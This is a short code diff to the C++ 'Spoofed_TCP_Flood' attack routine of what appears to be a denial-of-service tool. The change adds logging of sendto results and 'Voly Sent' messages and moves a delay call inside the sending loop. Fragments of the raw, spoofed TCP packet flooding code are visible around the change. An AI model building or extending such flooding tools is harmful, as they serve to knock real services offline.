@@ -10,6 +10,7 @@
 #include "Spoofed_TCP_Flood.hpp"
 
 void Spoofed_TCP_Flood::attack(const int *id) {
+    int r;
     std::vector<int> sockets;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
@@ -89,14 +90,20 @@ void Spoofed_TCP_Flood::attack(const int *id) {
             tcp->check = csum( (unsigned short*) pseudogram , psize);
 
 
-            if(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)) == -1){
+            if((r = static_cast<int>(sendto(sockets[x], buf, ip->tot_len, 0, (sockaddr*)&dst, sizeof(struct sockaddr_in)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_TCP);
+            }else{
+                message = std::string("Socket[") + std::to_string(x) + "->"
+                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
+                logger->Log(&message, Logger::Info);
+                message = std::to_string(*id) + ": Voly Sent";
+                logger->Log(&message, Logger::Info);
             }
+            message = std::to_string(*id) + ": Voly Sent";
+            logger->Log(&message, Logger::Info);
+            usleep(static_cast<__useconds_t>(conf->delay));
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
-        usleep(static_cast<__useconds_t>(conf->delay));
     }
 }
 
